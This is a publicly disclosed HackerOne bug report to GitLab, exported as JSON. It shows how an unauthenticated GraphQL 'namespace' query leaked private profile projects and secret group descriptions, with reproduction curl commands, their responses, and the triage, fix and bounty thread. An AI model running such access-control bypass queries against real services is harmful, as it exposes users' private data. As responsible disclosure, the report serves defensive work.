{"id":614355,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MTQzNTU=","url":"https://hackerone.com/reports/614355","title":"GraphQL query \"namespace\" leaks data","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-06-14T08:05:48.976Z","submitted_at":"2019-06-14T08:05:48.976Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"rpadovani","url":"/rpadovani","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/236/751/01f4c6286f531a1d26559ab1bd2f61a34d74792f_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-12-03T09:50:15.303Z","bug_reporter_agreed_on_going_public_at":"2019-12-03T09:11:59.176Z","team_member_agreed_on_going_public_at":"2019-12-03T09:50:15.205Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\u003e NOTE! Thanks for submitting a report! Please replace *all* the (parenthesized) sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!\n\n### Summary\n\nUsing the \"namespace\" query on Graphql you can retrieve some private data that is not available through Standard API or through Web API\n\n### Steps to reproduce\n#### User namespace\n\n1. My Gitlab profile is private: https://gitlab.com/rpadovani\n2. You cannot access a list of my projects: https://gitlab.com/users/rpadovani/contributed\n3. You cannot access these data through the standard APIs:\n```\ncurl --header \"PRIVATE-TOKEN: anotherUserToken\" 'https://gitlab.com/api/v4/namespaces/16048'\n{\"message\":\"404 Namespace Not Found\"}\n```\n(rpadovani user id is 16048, I used access token of another user for this curl request)\n4. You can however access all these data, without any token (so no need to be registered), through Graphql:\n\n```\ncurl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json' --data '{\"query\":\"{namespace(fullPath:\\\"rpadovani\\\") {description\\n requestAccessEnabled\\n fullName\\n fullPath\\n id\\n lfsEnabled\\n name\\n path\\n visibility\\n projects (includeSubgroups: true, ) {edges {node {id\\n name\\n archived\\n visibility\\n description}}}}}\",\"variables\":null,\"operationName\":null}' \n```\nResponse (omitted other 19 projects for brevity):\n\n```\n{\"data\":{\"namespace\":{\"description\":\"\",\"requestAccessEnabled\":true,\"fullName\":\"rpadovani\",\"fullPath\":\"rpadovani\",\"id\":\"gid://gitlab/Namespace/18021\",\"lfsEnabled\":true,\"name\":\"rpadovani\",\"path\":\"rpadovani\",\"visibility\":\"public\",\"projects\":{\"edges\":[{\"node\":{\"id\":\"gid://gitlab/Project/11265641\",\"name\":\"737-max-8\",\"archived\":false,\"visibility\":\"public\",\"description\":\"https://737max8.com\"}}, ...OMIT...     \n```\n \n#### Group namespace\n\nA Graphql query on a secret group / subgroup can bring to disclose the description of the group\n1. No access from GUI: https://gitlab.com/secret-group-213\n2. Access through GraphQL (please notice I do not provide any access token, at all):\n\n```\ncurl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json' --data '{\"query\":\"{namespace(fullPath:\\\"secret-group-213\\\") {description\\n requestAccessEnabled\\n fullName\\n fullPath\\n id\\n lfsEnabled\\n name\\n path\\n visibility\\n projects (includeSubgroups: true, ) {edges {node {id\\n name\\n archived\\n visibility\\n description}}}}}\",\"variables\":null,\"operationName\":null}'\n```\n\nResponse:\n\n```\n{\"data\":{\"namespace\":{\"description\":\"This description is secret!\",\"requestAccessEnabled\":false,\"fullName\":\"secret group\",\"fullPath\":\"secret-group-213\",\"id\":\"gid://gitlab/Group/5337756\",\"lfsEnabled\":true,\"name\":\"secret group\",\"path\":\"secret-group-213\",\"visibility\":\"private\",\"projects\":{\"edges\":[]}}}}\n```\n\n### Impact\n\nThis Graphql query makes the `private profile` feature quite useless, and leaks the description and some other information about private groups and subgroups.\n\nThe impact is limited because the GraphQL implementation is still at the beginning, I think that the impact of this issue would be bigger, if the GraphQL implementation was au-pair with the APIs implementation\n\n### Examples\n\n(If the bug is project related, please create an example project and export it using the project export feature)\n\n(If you are using an older version of GitLab, this will also help determine whether the bug has been fixed in a more recent version)\n\n(If the bug can be reproduced on GitLab.com without violating the `Rules of Engagement` as outlined in the program policy, please provide the full path to the project.)\n\n### What is the current *bug* behavior?\n\nAccess data that shouldn't be accessed\n\n### What is the expected *correct* behavior?\n\nempty response\n\n\n### Output of checks\n\nThis bug happens on GitLab.com\n\n#### Results of GitLab environment info\n\n## Impact\n\nAn attacker can bypass the \"private profile\" check, and can access metadata about secret groups","bounty_amount":"1000.0","formatted_bounty":"$1,000","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":58,"voters":["mashoud1122","base_64","sameerphad72","mik317","dhakal_ananda","ali","imranhudaa","trazer","eveeez","r0hack","and 48 more..."],"severity":{"rating":"medium","score":5.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":18138,"asset_type":"URL","asset_identifier":"gitlab.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5092582,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I confirm the report has easy to reproduce steps (there are two curl commands that can be run by anyone, also without a Gitlab account) and I explain which data are impacted and can be retrieved from Gitlab.com, which is fully in scope.","automated_response":false,"created_at":"2019-06-14T09:08:56.314Z","updated_at":"2019-06-14T09:08:56.314Z","actor":{"username":"rpadovani","cleared":false,"url":"/rpadovani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/236/751/01f4c6286f531a1d26559ab1bd2f61a34d74792f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5093304,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @rpadovani,\n\nThank you for submitting this report. We will investigate the issue as soon as possible.\nDue to our current workload, we will get back within 20 business days with an update.\n\nPlease refrain from submitting your report or inquiring about its status through\nadditional channels, as this unnecessarily binds resources in the security team.\n\nBest regards,\nGitLab Security Team\n","automated_response":true,"created_at":"2019-06-14T11:20:07.436Z","updated_at":"2019-06-14T11:20:07.436Z","actor":{"username":"gitlab-securitybot","cleared":false,"url":"/gitlab-securitybot","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5119055,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hello,\n\nThank you for submitting this report.\n\nWe have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab-ce/issues/63386. This issue will be made public 30 days following the release of a patch.\n\nWe will continue to update you via HackerOne as a patch is scheduled for release.\n\nBest regards,\nSecurity Team | GitLab Inc.","automated_response":false,"created_at":"2019-06-18T08:20:44.425Z","updated_at":"2019-06-18T08:20:44.425Z","actor":{"username":"jmatos_bgtvf","cleared":false,"url":"/jmatos_bgtvf","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5281407,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jmatos_bgtvf \n\nI haven't received any update, but it seems to me that you fixed the issue as reported in https://about.gitlab.com/2019/07/03/security-release-gitlab-12-dot-0-dot-3-released/, is that right?\n\nIf yes, can we schedule the public disclosure of this issue, according to your timeline?\n\nThanks!","automated_response":false,"created_at":"2019-07-09T13:06:42.325Z","updated_at":"2019-07-09T13:06:42.325Z","actor":{"username":"rpadovani","cleared":false,"url":"/rpadovani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/236/751/01f4c6286f531a1d26559ab1bd2f61a34d74792f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5297472,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hello @rpadovani,\n\nThank you again for the report! Your finding has been patched in GitLab version 12.0.3 and we are awarding a bounty. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.\n\nWe look forward to your next report!\n\nBest regards,\nSecurity Team | GitLab Inc.\n","automated_response":false,"created_at":"2019-07-11T07:36:23.704Z","updated_at":"2019-07-11T07:36:23.704Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"GitLab"}},"bounty_amount":"1000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"rpadovani","url":"/rpadovani"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5297475,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2019-07-11T07:36:44.951Z","updated_at":"2019-07-11T07:36:44.951Z","actor":{"username":"jmatos_bgtvf","cleared":false,"url":"/jmatos_bgtvf","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"rpadovani","url":"/rpadovani"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6454565,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Since the original over Gitlab.com has been disclosed, I'd like to disclose this as well :-)","automated_response":false,"created_at":"2019-12-03T09:11:59.194Z","updated_at":"2019-12-03T09:11:59.194Z","first_to_agree":true,"actor":{"username":"rpadovani","cleared":false,"url":"/rpadovani","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/236/751/01f4c6286f531a1d26559ab1bd2f61a34d74792f_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6454761,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-12-03T09:50:15.226Z","updated_at":"2019-12-03T09:50:15.226Z","actor":{"username":"jmatos_bgtvf","cleared":false,"url":"/jmatos_bgtvf","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6454762,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-12-03T09:50:15.327Z","updated_at":"2019-12-03T09:50:15.327Z","actor":{"username":"jmatos_bgtvf","cleared":false,"url":"/jmatos_bgtvf","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}